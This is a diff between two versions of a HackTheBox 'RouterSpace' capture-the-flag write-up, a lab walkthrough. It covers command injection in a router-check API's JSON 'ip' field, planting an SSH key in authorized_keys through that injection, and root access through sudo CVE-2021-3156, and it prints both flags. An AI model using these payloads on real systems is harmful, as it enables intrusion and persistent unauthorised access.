@@ -1,56 +1,53 @@
 ---
-title: Hackthebox Routerspace Writeup
+title: HackTheBox RouterSpace Writeup
 slug: hackthebox-routerspace-writeup
 description: Hackthebox release new machine called routerspace, in this machine we get the apk file on port 80 after analyzing the apk we get a new endpoint which is vulnerable with rce and we get the shell through that rce and for privilege escalation the sudo version is vulnerable through a very famous CVE-2021-3156.
-date: 2022-03-02
-image: hackthebox-routerspace-writeup.webp
+date: 2022-03-05
+image: routerspace.png
 ---
 
 import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
 import { components as MDXComponents } from '../../components/mdxComponents';
 export const components = MDXComponents;
 
-## Nmap
+## nmap
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace]
-└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.148
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 22:39 CST
+┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+└╼[★]$nmap -sC -sV -oA nmap 10.10.11.148
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-05 21:36 PKT
 Nmap scan report for 10.10.11.148
-Host is up (0.21s latency).
-Not shown: 998 filtered tcp ports (no-response)
+Host is up (0.18s latency).
+Not shown: 998 filtered ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     (protocol 2.0)
-| fingerprint-strings:
-|   NULL:
+| fingerprint-strings: 
+|   NULL: 
 |_    SSH-2.0-RouterSpace Packet Filtering V1
-| ssh-hostkey:
-|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
-|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
-|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
 80/tcp open  http
-| fingerprint-strings:
-|   FourOhFourRequest:
+| fingerprint-strings: 
+|   FourOhFourRequest: 
 |     HTTP/1.1 200 OK
 |     X-Powered-By: RouterSpace
-|     X-Cdn: RouterSpace-80933
+|     X-Cdn: RouterSpace-84175
 |     Content-Type: text/html; charset=utf-8
-|     Content-Length: 67
-|     ETag: W/"43-AfafAvUGMjC8j6gcRxIUp5a2eMw"
-|     Date: Wed, 02 Mar 2022 04:40:19 GMT
+|     Content-Length: 65
+|     ETag: W/"41-bo9lk6+f+tZQb/ChPLEuYmd0j6g"
+|     Date: Sat, 05 Mar 2022 16:54:44 GMT
 |     Connection: close
-|     Suspicious activity detected !!! {RequestID: EhF o Zx G 86 7 }
-|   GetRequest:
+|     Suspicious activity detected !!! {RequestID: b X kMM X 7 }
+|   GetRequest: 
 |     HTTP/1.1 200 OK
 |     X-Powered-By: RouterSpace
-|     X-Cdn: RouterSpace-12364
+|     X-Cdn: RouterSpace-76967
 |     Accept-Ranges: bytes
 |     Cache-Control: public, max-age=0
 |     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
 |     ETag: W/"652c-17d476c9285"
 |     Content-Type: text/html; charset=UTF-8
 |     Content-Length: 25900
-|     Date: Wed, 02 Mar 2022 04:40:17 GMT
+|     Date: Sat, 05 Mar 2022 16:54:42 GMT
 |     Connection: close
 |     <!doctype html>
 |     <html class="no-js" lang="zxx">
@@ -65,272 +62,180 @@ PORT   STATE SERVICE VERSION
 |     <link rel="stylesheet" href="css/magnific-popup.css">
 |     <link rel="stylesheet" href="css/font-awesome.min.css">
 |     <link rel="stylesheet" href="css/themify-icons.css">
-|   HTTPOptions:
+|   HTTPOptions: 
 |     HTTP/1.1 200 OK
 |     X-Powered-By: RouterSpace
-|     X-Cdn: RouterSpace-29181
+|     X-Cdn: RouterSpace-67272
 |     Allow: GET,HEAD,POST
 |     Content-Type: text/html; charset=utf-8
 |     Content-Length: 13
 |     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
-|     Date: Wed, 02 Mar 2022 04:40:17 GMT
+|     Date: Sat, 05 Mar 2022 16:54:43 GMT
 |     Connection: close
 |     GET,HEAD,POST
-|   RTSPRequest, X11Probe:
+|   RTSPRequest, X11Probe: 
 |     HTTP/1.1 400 Bad Request
 |_    Connection: close
 |_http-title: RouterSpace
-|_http-trane-info: Problem with XML parsing of /evox/about
 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port22-TCP:V=7.92%I=7%D=3/1%Time=621EF52E%P=x86_64-pc-linux-gnu%r(NULL,
+SF-Port22-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(NULL,
 SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port80-TCP:V=7.92%I=7%D=3/1%Time=621EF52F%P=x86_64-pc-linux-gnu%r(GetRe
-SF:quest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
-SF:-Cdn:\x20RouterSpace-12364\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
+SF-Port80-TCP:V=7.60%I=7%D=3/5%Time=6223919F%P=x86_64-pc-linux-gnu%r(GetRe
+SF:quest,2E91,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
+SF:-Cdn:\x20RouterSpace-76967\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
 SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
 SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
 SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
-SF:0Wed,\x2002\x20Mar\x202022\x2004:40:17\x20GMT\r\nConnection:\x20close\r
+SF:0Sat,\x2005\x20Mar\x202022\x2016:54:42\x20GMT\r\nConnection:\x20close\r
 SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
 SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
 SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
 SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
 SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
 SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
-SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\nx2
+SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
 SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
 SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
 SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
 SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
 SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,108
 SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
-SF:outerSpace-29181\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
+SF:outerSpace-67272\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
 SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
-SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Wed,\x2002\x20Mar\x202022\x2004:40:
-SF:17\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
+SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sat,\x2005\x20Mar\x202022\x2016:54:
+SF:43\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
 SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
 SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
-SF:lose\r\n\r\n")%r(FourOhFourRequest,129,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
-SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-80933\r\nContent-Type:
-SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2067\r\nETag:\x20W/
-SF:\"43-AfafAvUGMjC8j6gcRxIUp5a2eMw\"\r\nDate:\x20Wed,\x2002\x20Mar\x20202
-SF:2\x2004:40:19\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
-SF:ity\x20detected\x20!!!\x20{RequestID:\x20EhF\x20o\x20Zx\x20G\x2086\x20\
-SF:x207\x20}\n\n\n\n");
+SF:lose\r\n\r\n")%r(FourOhFourRequest,127,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
+SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-84175\r\nContent-Type:
+SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2065\r\nETag:\x20W/
+SF:\"41-bo9lk6\+f\+tZQb/ChPLEuYmd0j6g\"\r\nDate:\x20Sat,\x2005\x20Mar\x202
+SF:022\x2016:54:44\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20act
+SF:ivity\x20detected\x20!!!\x20{RequestID:\x20b\x20\x20\x20X\x20\x20kMM\x2
+SF:0\x20X\x207\x20\x20}\n\n");
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 46.49 seconds
+Nmap done: 1 IP address (1 host up) scanned in 79.97 seconds
 ```
 
-## Port-80
+Let’s visit port 8080
 
-It's a simple `static` page.
+<FixTheImageURL src="home.png" slug="routerspace" />
 
-Only `download` button is working that's give us an `routerspace.apk`.
 
-<FixTheImageURL src='web.png' slug='hackthebox-routerspace-writeup' />
+This appears to be a routing management system for an apartment
 
-Download that `RouterSpace.apk`.
+first look around
+
+Here, Download in the upper right corner will download an apk package. After downloading, use the simulator to run it and then burp to capture the package.
+
+need to install AnBox After installation, we start the emulator
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace/www]
-└──╼ [★]$ ls
-RouterSpace.apk
+adb shell settings put global http_proxy 192.168.18.4:8080
 ```
 
-Now here we do the `2` things reverse the `apk file` or run this apk in `GUI`.
-
-It's a `easy` box so i preffered run this in `GUI`.
-
-Ussing `Anbox` for that. you can use `android studio` or `genymotion` it's work the same.
-
-Install the `RouterSpace.apk` in `anbox`.
+Then after burp sets the listening port, use burp to proxy anbox
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace/www]
-└──╼ [★]$ adb install RouterSpace.apk
+[spy0x7㉿pop-os]─[/home/spy0x7/Downloads]
+└╼[★]$adb install RouterSpace.apk
+Success
 ```
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-routerspace-writeup' />
+<FixTheImageURL src="install.png" slug="routerspace" />
 
-Running the application click on `Check Status` it's said router is `working fine`.
 
-Let's `intercept` this in `burp`.
+Install the app, then open
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-routerspace-writeup' />
+<FixTheImageURL src="click.png" slug="routerspace" />
 
-but for that i `need` to first set the `proxy`.
+
+
+click on Check Status and intercept this in burp.
+
+<FixTheImageURL src="intercept.png" slug="routerspace" />
+
+
+send it to repeater tab.
+
+<FixTheImageURL src="repeater.png" slug="routerspace" />
+
+
+Add routerspace.htb to hosts
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace/www]
-└──╼ [★]$ adb shell settings put global http_proxy 10.10.14.28:8001
+sudo echo 10.10.11.148 routerspace.htb >> /etc/hosts
 ```
 
-Now `configure` the `burp` to `intercept` the traffic of `tun0` ip.
 
-<FixTheImageURL src='burp.png' slug='hackthebox-routerspace-writeup' />
+let's play with the Request :) 
 
-Now `everything` is set let's `click` on `Check Status`
+try to execute the command
 
-`Captured` the `req`.
+<FixTheImageURL src="id.png" slug="routerspace" />
 
-<FixTheImageURL src='burp1.png' slug='hackthebox-routerspace-writeup' />
 
-Let's send it to `repeater` tab.
+oh it's work command execute successfully
 
-## routerspace.htb
 
-But it's going on `routerspace.htb`.
-
-<FixTheImageURL src='burp2.png' slug='hackthebox-routerspace-writeup' />
-
-Let's add this in `/etc/hosts` file.
+let's try to generate a sshkey, and then write it in to log in with ssh.
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace/www]
-└──╼ [★]$ cat /etc/hosts
-127.0.0.1       localhost
-127.0.1.1       parrot
-
-#custom
-10.10.11.148    routerspace.htb
-
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-```
-
-Now send the `req`.
-
-<FixTheImageURL src='burp3.png' slug='hackthebox-routerspace-writeup' />
-
-Let's try `command injection` with `id`.
-
-But it's `reflected` the same `string`.
-
-<FixTheImageURL src='burp4.png' slug='hackthebox-routerspace-writeup' />
-
-## RCE
-
-Now let's try to do some `basic` method to `bypass` the `filter`.
-
-I `simply` add `\n` in front of `command`.
-
-```bash
-POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
-accept: application/json, text/plain, */*
-user-agent: RouterSpaceAgent
-Content-Type: application/json
-Content-Length: 13
-Host: routerspace.htb
-Connection: close
-Accept-Encoding: gzip, deflate
-
-{"ip":"\nid"}
-```
-
-And it's `work`🔥.
-
-<FixTheImageURL src='burp5.png' slug='hackthebox-routerspace-writeup' />
-
-Now i try different method to get `rev shell` but non of them working because of `ip tables` rules.
-
-Let's `check` if there is any `id_rsa key` in paul `.ssh` directory.
-
-<FixTheImageURL src='burp6.png' slug='hackthebox-routerspace-writeup' />
-
-Nothing there so i decided to add my `public id_rsa` key inside paul `.ssh` directory.
-
-But first let's `generate` the key.
-
-```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/.ssh]
-└──╼ [★]$ ssh-keygen
+┌[spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace]
+└╼[★]$ssh-keygen
 Generating public/private rsa key pair.
-Enter file in which to save the key (/root/.ssh/id_rsa):
-/root/.ssh/id_rsa already exists.
-Overwrite (y/n)? y
-Enter passphrase (empty for no passphrase):
-Enter same passphrase again:
-Your identification has been saved in /root/.ssh/id_rsa
-Your public key has been saved in /root/.ssh/id_rsa.pub
+Enter file in which to save the key (/home/spy0x7/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/spy0x7/.ssh/id_rsa.
+Your public key has been saved in /home/spy0x7/.ssh/id_rsa.pub.
 The key fingerprint is:
-SHA256:w1dSKkkL1ivZaDkPcJt5v9zi/31tj5AuJr1QkOeuscI root@parrot
+SHA256:rTz1OM1hCkc75iB/wFp7RaE9o4MDxfzV3FuEmNxCBRY spy0x7@pop-os
 The key's randomart image is:
-+---[RSA 3072]----+
-|      o..   .    |
-|    ...o.+ o     |
-|     o O*.+ .    |
-|      %.+= o     |
-|     . *S.+      |
-|        .=.  .   |
-|     .  oo.oo   .|
-|      E .=B... o+|
-|       .o+o=o.o.=|
++---[RSA 2048]----+
+|       o.  oEX.+.|
+|       .o  +*.= o|
+|      .  .o.=.  o|
+|       o +.+ o . |
+|      . S X +    |
+|       * % @ .   |
+|      . * B +    |
+|         + .     |
+|                 |
 +----[SHA256]-----+
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/.ssh]
-└──╼ [★]$ ls
-id_rsa  id_rsa.pub  keys  known_hosts
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/.ssh]
-└──╼ [★]$ cat id_rsa.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCUQZjW1AN3DqW+6Idy+le1dnTIiw0mScvHcsza0Rqsz3y8LY0nPq+7QlmeF6n76GMcs3+/ZNnc3zxUAURMwQ6FNlS86wOxGTN8H4na4WIhFKjQ0Axs6GrfA+M+Zref1x8C6rncOEJWec67VAUa3k7p2CSyc1Ev5mrPv4RFbNX8yl4Nss+q+jnvpgu7xnE6J9+RXSG5VoYHBzk/S4vvKn/55UF3er3KUaWg9XfS5mGiQ03NUFCGTWf9qzLCYosmwEv1NINPMXKbWU2ThL+KMRTNhPno92KCogDM+S1yKarUQ0Eam1Iga+bGcBTY9Rv188FFZR2G6tMq+wb98Z/zWOF8f3kYs1ZblmxVHZGzJjbwn3qx2RoO7uLfLmgZ7pFWZXGjHEp5G0AEknX+IQtXlLgddnPyxT5o6+7xIlouhr02uw4ziFgCRhxcvWhXc4Fz1eTjLIxd8P/hWz3yrK3mfoi6AegPo/AnnheesHciDH9O+gZRMb5XlVVce8jFYP8MzCc= root@parrot
 ```
 
-## Adding id_rsa inside the paul directory
+Then save the content of id_rsa.pub as authorized_keys
 
-Now let's add this in `paul .ssh directory`.
 
 ```js
-POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
-accept: application/json, text/plain, */*
-user-agent: RouterSpaceAgent
-Content-Type: application/json
-Content-Length: 34
-Host: routerspace.htb
-Connection: close
-Accept-Encoding: gzip, deflate
-
-{"ip":"\necho 'your public id_rsa key' >> /home/paul/.ssh/authorized_keys"}
+{"ip":"0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAQDEfXW5jWSjNdbuSVZWszzfpNq/oeG+WwH5imomLf/N7QJNKAWkbFTk3RMxRBzy9a3pHF7CubMLhykOzjz+4ap22GDkjdA/FL4ha9siGXboor+dpqm4WcfjPy6CdQUroHV0qfNNOz5qT0SfeATsi1udmv8oh1MAfeFNTLaXM0w7JP6EHdcIo2OdJJOsy0jBwQEIf3LsRLl2Q8VLtltR28N7ZTcJzUcuGZpksv3OvUDt2f4NxZCtL3vMwkTJj5wkJy8CpGti473QG2pPU3BcRKOY+RvycqJA3Hz6nN3dbG7lXDEa6PgrzuUXb6dJTB9Rseqq0c69QCHnvQ3B/1ZLig/b spy0x7@pop-os' > /home/paul/.ssh/authorized_keys"}
 ```
 
-Using `double greater then sign(>>)` because i don't want to `overwrite` someone `ssh key` so this `simply append` the file `content`.
-
-<FixTheImageURL src='burp7.png' slug='hackthebox-routerspace-writeup' />
-
-Checking the file is `exist` there or not and `It is`.
-
-<FixTheImageURL src='burp8.png' slug='hackthebox-routerspace-writeup' />
-
-Now let's get the `ssh` connection
+Then use ssh to log in
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/.ssh]
-└──╼ [★]$ chmod 600 id_rsa
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/.ssh]
-└──╼ [★]$ ssh -i id_rsa paul@10.10.11.148
-The authenticity of host '10.10.11.148 (10.10.11.148)' can't be established.
-ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.11.148' (ECDSA) to the list of known hosts.
+┌[spy0x7㉿pop-os]─[/home/spy0x7/.ssh]
+└╼[★]$ssh paul@10.10.11.148
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-  System information as of Wed 02 Mar 2022 06:24:20 AM UTC
+  System information as of Sat 05 Mar 2022 05:28:13 PM UTC
 
-  System load:           0.0
-  Usage of /:            70.3% of 3.49GB
-  Memory usage:          17%
+  System load:           0.03
+  Usage of /:            70.6% of 3.49GB
+  Memory usage:          20%
   Swap usage:            0%
-  Processes:             215
+  Processes:             213
   Users logged in:       0
   IPv4 address for eth0: 10.10.11.148
-  IPv6 address for eth0: dead:beef::250:56ff:feb9:409e
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:29a7
 
  * Super-optimized for small spaces - read how we shrank the memory
    footprint of MicroK8s to make it the smallest full K8s around.
@@ -344,64 +249,67 @@ To see these additional updates run: apt list --upgradable
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
-paul@routerspace:~$ id
-uid=1001(paul) gid=1001(paul) groups=1001(paul)
-paul@routerspace:~$ cat user.txt
-66bf7d5d97a891ce98c187dd36a57d36
+
+Last login: Sat Mar  5 15:41:03 2022 from 10.10.15.171
+paul@routerspace:~$ 
+paul@routerspace:~$ ls
+snap  user.txt
 paul@routerspace:~$
 ```
+Successfully login on user 
+
+```js
+paul@routerspace:~$ cat user.txt 
+75e43b546b55786f3e9435473fd56c26
+```
+
+Get the flag
 
 ## Privilege escalation
 
-### Recon with linpeas
+First, We run a linpeas.sh script to see if there are any privilege escalation
 
-Now due to `iptables` rules we don't simply curl the `linpeas` file but we can use `scp` to copy the file through `ssh`.
+After running we see sudo 1.8.31 is vulnerable.
+
+There is a vulnerability CVE-2021-3156 seen here
+
+[GitHub: Sudo 1.8.31 Root Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
+
+
+Let's transfer the exploit through ssh.
+
 
 ```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[/opt/privilege-escalation-awesome-scripts-suite/linPEAS]
-└──╼ [★]$ ls
-images  linpeas.sh  README.md
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[/opt/privilege-escalation-awesome-scripts-suite/linPEAS]
-└──╼ [★]$ scp -i /root/.ssh/id_rsa linpeas.sh paul@10.10.11.148:.
-linpeas.sh                                  100%  322KB 276.7KB/s   00:01
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa shellcode.c  paul@10.10.11.148:.
+Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
+shellcode.c                                                                                          100%  599     3.3KB/s   00:00    
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa Makefile  paul@10.10.11.148:.
+Warning: Identity file /root/.ssh/id_rsa not accessible: Permission denied.
+Makefile                                                                                             100%  208     1.2KB/s   00:00    
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_  paul@10.10.11.148:.
+┌[]─[10.10.14.176][spy0x7㉿pop-os]─[/home/spy0x7/Desktop/ctf/htb/RouterSpace/Sudo-1.8.31-Root-Exploit]
+└╼[★]$scp -i /root/.ssh/id_rsa exploit.c  paul@10.10.11.148:.
+file
+exploit.c
 ```
 
-Now we have the `linpeas` let's `run` it.
+lets run our exploit
 
 ```js
-paul@routerspace:~$ ls
-linpeas.sh  snap  user.txt
-paul@routerspace:~$ ./linpeas.sh | tee linPEAS_output
-```
-
-And we see `sudo` is `vulnerable`.
-
-<FixTheImageURL src='cmd2.png' slug='hackthebox-routerspace-writeup' />
-
-## CVE-2021-3156
-
-Link : https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
-
-Let's transfer the `exploit` through `ssh`.
-
-```js
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace]
-└──╼ [★]$ vim exploit.py
-┌───[us-free-1]─[10.10.14.28]─[root@parrot]─[~/Desktop/HTB/RouterSpace]
-└──╼ [★]$ scp -i /root/.ssh/id_rsa exploit.py  paul@10.10.11.148:.
-exploit.py                                  100% 8180    38.4KB/s   00:00
-```
-
-And we get the `root.txt`.
-
-```js
-paul@routerspace:~$ ls
-exploit.py  linPEAS_output  linpeas.sh  snap  user.txt
-paul@routerspace:~$ python3 exploit.py
+paul@routerspace:~/exploit$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+paul@routerspace:~/exploit$ ./exploit 
 # id
 uid=0(root) gid=0(root) groups=0(root),1001(paul)
 # cat /root/root.txt
-47246ca2615dd54d5912e0b37488f79d
+567eb556acf2d31ef537b9cfde601e30
 ```
+
+Successfully root the machine
